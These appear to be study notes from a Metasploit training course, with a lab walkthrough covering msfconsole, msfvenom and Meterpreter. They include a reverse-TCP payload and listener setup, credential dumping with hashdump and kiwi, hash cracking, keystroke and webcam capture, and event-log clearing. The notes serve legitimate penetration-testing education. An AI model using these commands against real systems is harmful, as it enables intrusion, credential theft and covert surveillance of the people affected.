# Metasploit: Introduction

### Main Components of Metasploit

`msfconsole`

- **Exploit:** A piece of code that uses a vulnerability present on the target system.

- **Vulnerability**: A design, coding, or logic flaw affecting the target system. The 
exploitation of a vulnerability can result in disclosing confidential information or allowing 
the attacker to execute code on the target system.

- **Payload**: An exploit will take advantage of a vulnerability. However, if we want the 
exploit to have the result we want (gaining access to the target system, read confidential 
information, etc.), we need to use a payload. Payloads are the code that will run on 
the target system.

### Modules

`/usr/share/metasploit-framework/modules`

**Auxiliary**: Any supporting module (scanners, crawlers and fuzzers) can be found here

**Encoders**: Encoders will allow you to encode the exploit and payload in the hope that a 
signature-based antivirus solution may miss them.

**Evasion**: While encoders will encode the payload, they should not be considered a direct 
attempt to evade antivirus software. On the other hand, “evasion” modules will try that, with 
more or less success.

**Exploits**: Exploits, neatly organised by target system

**NOPs**: NOPs (No OPeration) do nothing, literally.In the Intel x86 CPU family they are 
represented with 0x90, following which the CPU will do nothing for one cycle. They are often 
used as a buffer to achieve consistent payload sizes.

**Payloads**: Payloads are code that will run on the target system.

- **Singles**: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need 
to download an additional component to run.

- **Stagers**: Responsible for setting up a connection channel between Metasploit and the 
target system. Useful when working with staged payloads. “Staged payloads” will first upload 
a stager on the target system then download the rest of the payload (stage). This provides 
some advantages as the initial size of the payload will be relatively small compared to the 
full payload sent at once.

- **Stages**: Downloaded by the stager. This will allow you to use larger sized payloads.

**Post**: Post modules will be useful on the final stage of the penetration testing process 
listed above, post-exploitation.

### Msfconsole

`search` can use various tags `cve:`, `type:`
`use <module name OR search result #>` to select module
`show options` to display exploit options
`show payloads` to display exploit payloads
`back` to leave the module
`info` for more information about the module
`set <parameter name> <value>` set a parameter
`setg <parameter name> <value>` set a global parameter
`unset <parameter name>` clear parameter
`unsetg <parameter name>` clear global parameter
`unset all` clear all parameters
`exploit` or `run` to execute the module, add `-z` tag to background session
`check` supported by some modules, checks target system is vulnerable without exploiting it
`background` background the session prompt
`sessions` view existing sessions
`sessions -i <session number>` interact with a session

Ranking: https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking

# Metasploit: Exploitation

### Scanning

#### Port Scanning

nmap directly
`search portscan`

#### UDP service Identification

`scanner/discovery/udp_sweep` to identify UDP services

#### SMB Scans

`search type:auxiliary scanner smb` for all SMB scanners

*Don't forget to scan for the more exotic services like NetBIOS*

### The Metasploit Database

Start postgresql service `systemctl start postgresql`
Initialise the db `msfdb init`
Check db status in msfconsole `db_status`
Run nmap scan output results to db `db_nmap -sV -p- 10.10.11.12`
View hosts in db `hosts`
View services in db `services`

Look for low hanging fruit like HTTP, FTP, SMB, SSH, RDP

### Vulnerability Scanning

Scan hosts for services `db_nmap -sV -p- 10.10.11.12` then use the search 
feature to find scanner modules for those services.

### Exploitation

nmap -sV -p- 10.10.243.231
```
Services
========

host           port   proto  name               state  info
----           ----   -----  ----               -----  ----
10.10.243.231  135    tcp    msrpc              open   Microsoft Windows RPC
10.10.243.231  139    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn
10.10.243.231  445    tcp    microsoft-ds       open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.243.231  3389   tcp    ssl/ms-wbt-server  open
10.10.243.231  49152  tcp    msrpc              open   Microsoft Windows RPC
10.10.243.231  49153  tcp    msrpc              open   Microsoft Windows RPC
10.10.243.231  49154  tcp    msrpc              open   Microsoft Windows RPC
10.10.243.231  49158  tcp    msrpc              open   Microsoft Windows RPC
10.10.243.231  49159  tcp    msrpc              open   Microsoft Windows RPC
```

Check low hanging fruit first!! 

port 445 (SMB) open, vulnerable to eternal_blue

### Msfvenom

`msfvenom` allows you to generate payloads. Gives access to all available payloads 
available in the Metasploit framework and allows you to create payloads in many different
formats (PHP,exe, dll, elf, etc.) and for diferent target systems (Apple, Windows, Linux, 
Android, etc.).

#### Payload

Use the `-p` tag followed by the payload.

List payloads:
`msfvenom -l payloads`

#### Output format

Use the `-f` tag followed by the desired format.

List output formats:
`msfvenom --list formats`

#### Encode

Use the `-e` tag followed by the format/encoding e.g. `php/base64`

#### Handlers

Use the `exploit/multi/handler` module to catch shells.

Set the payload value `set payload` and options required then `run` the handler. 

Example:

Generate payload:
`msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f elf > shell.elf`

Start multi/handler:
```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST <IP>
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on <IP>:4444
```

Upload payload to target (python3 -m http.server 9000 on attack machine)

Enable execution:
`chmod +x ./shell.elf`

Execute and catch:
target > `./shell.elf`
attack > `meterpreter >`

# Metasploit: Meterpreter

### Introduction to Meterpreter

Meterpreter is a Metasploit payload that runs on the target system as an agent within 
command and control architecture.

#### How Meterpreter works

It runs in memory, so it will be seen as a process and avoid detection by scanning as most 
antivirus software will scan new files. 

Meterpreter also aims to avoid IPS and IDS by using encrypted communication with the server 
Metasploit is running on (usually the attacking machine). If the target org doesn't decrypt 
and inspect encrypted traffic (e.g HTTPS) comiong in and out of the local network IPS and 
IDS solutions won't detect it's activities.

While Meterpreter is recognized by major antivirus software, this feature provides some 
degree of stealth.

We can use `getpid` from Meterpreter to find the process id (no Meterpreter.exe as you 
might expect) and look at the dll's used by Meterpreter (no meterpreter.dll either).
`tasklist /m /fi "pid eq <pid here>"`  

Meterpreter also establishes an encrypted (TLS) communication channel with the attacker's 
system.

### Meterpreter Flavours

Metasploit payloads are divided into two categories; inline, aka single, and staged.

Using msfvenom we can list meterpreter payloads: 
`msfvenom --list payloads | grep 'meterpreter'`

Which version of Metrpreter to use is based mostly on three factors:
- The target OS
- Components available on the target system (Python installed? PHP website etc.)
- Network connection types you can have with the target system (Are raw TCP connections 
allowed? Can you only have an HTTPS reverse connection? Are IPv6 adresses not as closely
monitored as IPv4? etc.)

### Meterpreter Commands

`help` will list available commands on any Meterpreter session.

Every version of Meterpreter will have different commands.

#### Most common commands

Core commands:

- `background` Backgrounds current session
- `exit` Terminate the Meterpreter session
- `guid` Get the session GUID (Globally Unique Identifier)
- `help` Display help menu
- `info` Displays information about a Post (post exlpoitation) module
- `irb` Opens an interactive Ruby shell on the current session
- `load` Loads one or more Meterpreter extensions
- `migrate` Allows you to migrate Meterpreter to another process
- `run` Executes a Meterpreter script or Post module
- `sessions` Quickly switch to another session

File system commands:

- `cd, ls, pwd, cat, rm` Same as usual
- `edit` Allows you to edit a file 
- `search` Search for a file
- `upload` Upload a file or directory
- `download` Download a file or directory

Networking commands:

- `arp` Displays the host ARP cache
- `ifconfig` Displays network interfaces available on target system
- `netstat` Displays the network connections
- `portfwd` Forwards a local port to a remote service
- `route` Allows you to view and modify the routing table

System commands:

- `clearev` Clear the event logs
- `execute` Executes a command
- `getpid` Shows the current process identifier
- `getuid` Shows the user that Meterpreter is running
- `kill` Terminate a process
- `pkill` Terminate process by name
- `ps` List running processes
- `reboot` Reboots the remote computer
- `shell` Drop into system shell
- `shutdown` Shuts down the remote computer
- `sysinfo` Gets information about the remote system

Other commands:

- `idletime` Returns the number of seconds the remote user has been idle
- `keyscan_dump` Dumps the keystroke buffer
- `keyscan_start` Starts capturing keystrokes
- `keyscan_stop` Stops capturing keystrokes
- `screenshare` Allows you to watch the remote user's desktop in real time
- `record_mic` Records audio from the default microphone for x seconds
- `webcam_chat` Starts a video chat
- `webcam_list` Lists webcams
- `webcam_snap` Takes a snapshot from the specified webcam
- `getsystem` Attempts to elevate your privilege to that of local system
- `hashdump` Dumps the content of the SAM database

### Post-Exploitation with Meterpreter

Use `help` to list available commands.

Use `getuid` to check the user to gauge current privilege levels.

Use `ps` to view running processes and find potential migration targets.

Use `migrate <pid>` to migrate to that process and better interact with it. You may lose 
your user privileges if migrating from a higher privileged user and you may not be able to 
gain them back.

Use `hashdump` to list the contents of the SAM database (Security Account Manager), where 
the users passwords are stored in the NTLM format.

While it is not mathematically possible to "crack" these hashes, you may still discover the 
cleartext password using online NTLM databases or a rainbow table attack. These hashes can 
also be used in Pass-the-Hash attacks to authenticate to other systems that these users can 
access the same network.

Use `search` to find flags in CTF scenarios or user generated/configuration files, that may 
contain user passwords, in peneteration tests.

Use `shell` to launch a regular command shell. Pressing CTRL+Z will help you go back to the 
Meterpreter shell. 

### Post-Exploitation Challenge

Start with exploit/windows/smb/psexec using:
Username: ballen
Password: Password1

1. What is the computer name?

Use `sysinfo` to find ACME_TEST
```
meterpreter > sysinfo
Computer        : ACME-TEST
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : FLASH
Logged On Users : 7
Meterpreter     : x86/windows

```  

2. What is the target domain?

Use `sysinfo` to find FLASH

OR

(Hint) Background the session and use the `post/windows/gather/enum_domain` module

3. What is the name of the share likely created by the user?

Navigate to `C:\` and `ls Shares` to find speedster 

OR

(Hint) Background the session and use the `post/windows/gather/enum_domain` module

4. What is the NTLM hash of the jchambers user?

Use `load kiwi` to load mimikatz then use `dcsync_ntlm jchambers` to retrieve user NTLM

OR

(Hint) Find the lsass.exe process id `Get-Process -Name lsass` and `migrate` to it then run 
`hashdump`

5. What is the cleartext password of the jchambers user?

Use `https://hashes.com/en/decrypt/hash` to decrypt the NTLM hash finding Trustno1

OR

(Hint) Use `crackstation.net`

6. Where is the secrets.txt file located?

Use `search -f secrets.txt` to find `C:\Program Files (x86)\Windows Multimedia Platform\`

7. What is the Twitter password revealed in secrets.txt?

Use `cat "C:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"` to find 
KDSvbsw3849!

8. Where is the realsecret.txt file located?

Use `search -f realsecret.txt` to find `C:\inetpub\wwwroot\`

9. What is the real secret?

Use `cat C:\inetpub\wwwroot\realsecret.txt` to find The Flash is the fastest man alive
